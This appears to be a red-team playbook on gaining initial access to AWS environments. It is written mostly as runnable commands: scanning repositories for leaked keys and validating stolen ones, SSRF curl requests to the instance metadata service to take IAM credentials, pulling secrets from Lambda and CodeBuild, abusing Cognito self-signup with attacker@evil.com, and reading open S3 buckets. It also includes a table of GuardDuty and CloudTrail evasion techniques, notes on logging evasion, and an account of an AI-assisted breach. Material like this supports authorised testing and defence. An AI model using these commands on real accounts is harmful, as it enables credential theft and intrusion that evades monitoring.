# AWS Initial Access
> **MITRE ATT&CK**: Initial Access > T1078.004 - Valid Accounts: Cloud Accounts
> **Platforms**: AWS
> **Required Privileges**: None (external) to Low
> **OPSEC Risk**: Medium

## Strategic Overview

AWS initial access revolves around credential theft and service misconfiguration. Unlike
on-prem where you exploit vulnerabilities, cloud initial access almost always means
finding or stealing valid credentials. The most common vectors are leaked access keys,
SSRF to instance metadata, and misconfigured public-facing services. A red team lead
must understand that a single access key can unlock an entire AWS organization.

## Technical Deep-Dive

### Access Key Leaks -- GitHub & Repository Scanning

```bash
# truffleHog - scan repos for high-entropy strings and known patterns
trufflehog git https://github.com/target/repo --only-verified

# git-secrets - scan for AWS key patterns
git secrets --scan -r /path/to/cloned/repo

# Manual regex for AWS keys
# Access Key ID: AKIA[0-9A-Z]{16}
# Secret Key: 40-char base64 string
grep -rE "AKIA[0-9A-Z]{16}" /path/to/repo
grep -rE "aws_secret_access_key\s*=\s*.{40}" /path/to/repo

# Validate stolen keys
aws sts get-caller-identity --profile stolen
```

### SSRF to IMDSv1 -- Instance Metadata Service

```bash
# Classic IMDSv1 SSRF (no token required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Response contains temporary credentials:
# AccessKeyId, SecretAccessKey, Token (session token)

# IMDSv2 - requires PUT with hop limit (harder to SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 bypass attempts:
# - If hop limit is >1 and you have container access, forward the request
# - DNS rebinding: point attacker domain at 169.254.169.254
# - Use IPv6 link-local equivalent if available
```

### Lambda Environment Variable Leaks

```bash
# If you can read Lambda function configuration
aws lambda get-function --function-name target-function --query 'Configuration.Environment'
# Environment variables often contain:
# DB_PASSWORD, API_KEY, AWS_ACCESS_KEY_ID, SECRET_KEY, JWT_SECRET

# Lambda code download (if accessible)
aws lambda get-function --function-name target-function --query 'Code.Location' -o text
# Returns presigned URL to download the deployment package
```

### Cognito Misconfiguration

```bash
# Enumerate Cognito User Pools with self-signup enabled
aws cognito-idp sign-up \
  --client-id TARGET_CLIENT_ID \
  --username attacker@evil.com \
  --password 'P@ssw0rd123!' \
  --user-attributes Name=email,Value=attacker@evil.com

# Cognito Identity Pool - unauthenticated role
aws cognito-identity get-id --identity-pool-id REGION:POOL-GUID
aws cognito-identity get-credentials-for-identity --identity-id REGION:IDENTITY-GUID
# Returns temporary AWS credentials for the unauth IAM role
```

### CI/CD Pipeline Credential Theft

```bash
# CodeBuild - environment variables often contain secrets
aws codebuild batch-get-projects --names target-project \
  --query 'projects[].environment.environmentVariables'

# CodePipeline - artifact store may contain credentials
aws codepipeline get-pipeline --name target-pipeline

# Check for buildspec.yml with hardcoded secrets in S3 artifact buckets
aws s3 cp s3://codepipeline-bucket/artifacts/buildspec.yml -
```

### Cross-Account Role Assumption

```bash
# If you find a role trust policy that allows your compromised account
aws sts assume-role \
  --role-arn arn:aws:iam::TARGET_ACCOUNT:role/CrossAccountRole \
  --role-session-name recon-session \
  --duration-seconds 3600

# Export the returned temporary credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity  # Confirm you are now in target account
```

### S3 Bucket Misconfiguration

```bash
# Unauthenticated access
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/sensitive-file.txt . --no-sign-request

# Bucket policy allows wildcard principal
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request 2>/dev/null

# ACL misconfiguration (public write)
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
```

## Detection & Evasion

| Detection Mechanism                | Evasion Technique                              |
|------------------------------------|------------------------------------------------|
| GuardDuty: UnauthorizedAccess      | Use credentials from expected source IPs       |
| CloudTrail: ConsoleLogin anomaly   | Stick to CLI/API; avoid console if unusual     |
| GuardDuty: InstanceCredentialExfil | Use SSRF creds from within the same VPC        |
| Access Analyzer: External access   | Operate within trust boundaries when possible  |
| VPC Flow Logs: IMDS access         | IMDSv1 SSRF looks like normal instance traffic |

```bash
# Check if GuardDuty is enabled in the account
aws guardduty list-detectors --region us-east-1

# Check CloudTrail status
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name default
```

## 2025 Techniques

### SSRF-to-IMDS Credential Theft Campaign (March 2025)

```
# Targeted campaign documented by F5 Labs (March 13-25, 2025)
# MITRE: T1552.005 / T1190

# Attackers exploited SSRF bugs in AWS EC2-hosted websites
# to reach internal EC2 metadata URL and expose IAM credentials

# Specific parameter names rotated:
# dest, file, redirect, target, URI, URL
# Targeted subpaths: /meta-data/, /user-data/

# Escalation path:
# Limited IAM User -> SSRF to IMDS -> Retrieve Temporary Credentials
# -> Assume EC2 IAM Role -> Enumerate Permissions
# -> Abuse Role Privileges -> Full Admin Access

# IMDSv1 remains widely exploitable in production environments
# IMDSv2 adoption is NOT universal

# Red team testing:
# Test SSRF parameters against http://169.254.169.254/latest/meta-data/
# Include the 6 parameter names documented in the campaign
```

### Pandoc SSRF to AWS IMDS (CVE-2025-51591)

```
# Wiz Research (August-September 2025)
# MITRE: T1190 / T1552.005

# SSRF vulnerability in Pandoc document processing library
# Attackers inject specially crafted HTML iframe elements
# Used in the wild to steal EC2 IAM credentials through IMDS

# Evolution beyond simple HTTP redirect SSRF:
# Document-processing SSRF through embedded iframes
# Expanding attack surface for IMDS credential theft
# through unexpected entry points (document conversion services)
```

### Shadow Roles -- Default IAM Role Abuse

```
# Aqua Security (May 2025)
# MITRE: T1078.004 / T1548

# AWS services automatically create default IAM roles with
# overly broad policies during initial setup:

# SageMaker: AmazonSageMaker-ExecutionRole (AmazonS3FullAccess)
# Glue: AWSGlueServiceRole (AmazonS3FullAccess)
# EMR: AmazonEMRStudio_RuntimeRole (AmazonS3FullAccess)
# Lightsail: Auto-created with excessive S3 access

# Attack scenario:
# 1. Upload malicious ML model to Hugging Face
# 2. Import model into SageMaker for code execution
# 3. Pivot to Glue by injecting a backdoor
# 4. S3 full access enables manipulation of CloudFormation,
#    SageMaker, Glue, EMR, and AWS CDK

# AWS has modified default role policies, but legacy environments
# remain at risk
```

### React2Shell (CVE-2025-55182) -- Cross-Cloud IMDS Exploitation

```
# CVSS 10.0 -- Pre-auth RCE in React Server Components / Next.js
# Disclosed December 3, 2025; exploited December 5, 2025
# MITRE: T1190 / T1552.005

# Single malicious HTTP request achieves code execution
# Attackers immediately targeted IMDS endpoints across ALL providers:
# - AWS: 169.254.169.254
# - Azure: 169.254.169.254
# - GCP: metadata.google.internal

# China state-nexus groups (Earth Lamia, Jackpot Panda)
# exploited within hours of disclosure

# Post-exploitation payloads: VShell, EtherRAT, SNOWLIGHT,
# ShadowPAD, XMRig, TruffleHog, Gitleaks
```

### AWS Cloud Logging Evasion Techniques

```
# CloudTrail Policy Size Exploitation (Permiso, 2025):
# Pad IAM policy documents with whitespace to trigger
# CloudTrail's logging size constraints -> incomplete logging

# Protocol Header Manipulation:
# Change AWS protocol header from JSON 1.1 to 1.0
# Enumerate API access WITHOUT creating CloudTrail logs

# Undocumented iamadmin service:
# Historically did not log any events in CloudTrail

# S3 Lifecycle Shadow Deletes (AWSDoor):
# Configure lifecycle policy with 1-day expiration
# Objects disappear without delete API calls
# No standard audit trail for the deletion
```

### 8-Minute AI-Assisted AWS Environment Breach

```
# Dark Reading, The Register, Permiso (November 28, 2025)
# MITRE: T1078.004 / T1059

# A threat actor leveraged LLMs to automate reconnaissance,
# generate malicious code, and make real-time decisions
# during an AWS compromise

# Attack timeline:
# - Initial access to full administrator rights in under 10 minutes
# - LLMs played a pivotal role in both the speed of operations
#   and agility of lateral movement
# - The attacker abused Amazon Bedrock for LLMjacking

# Significance:
# First documented case of AI-accelerated cloud attack lifecycle
# Demonstrates that defender response windows are shrinking
# dramatically when attackers use AI assistance

# Red team implications:
# AI-assisted attack chains compress the entire kill chain
# Traditional detection and response timelines may be insufficient
# Organizations must evaluate whether their detection pipeline
# can alert and respond within single-digit minute windows
```

## Cross-References

- [AWS IAM Privilege Escalation](aws-iam-escalation.md)
- [AWS Persistence Techniques](aws-persistence.md)
- [AWS Services Abuse](aws-services-abuse.md)
- [Cloud Attack Methodology](../cloud-methodology.md)

## References

- https://hackingthe.cloud/aws/general-knowledge/
- https://github.com/RhinoSecurityLabs/pacu
- https://github.com/trufflesecurity/trufflehog
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
- F5 Labs SSRF Campaign: https://www.f5.com/labs/articles/threat-intelligence/
- Pandoc SSRF (CVE-2025-51591): https://www.wiz.io/blog/pandoc-ssrf
- Shadow Roles: https://blog.aquasec.com/aws-shadow-roles
- AWSDoor: https://www.riskinsight-wavestone.com/en/2025/09/awsdoor-persistence-on-aws/
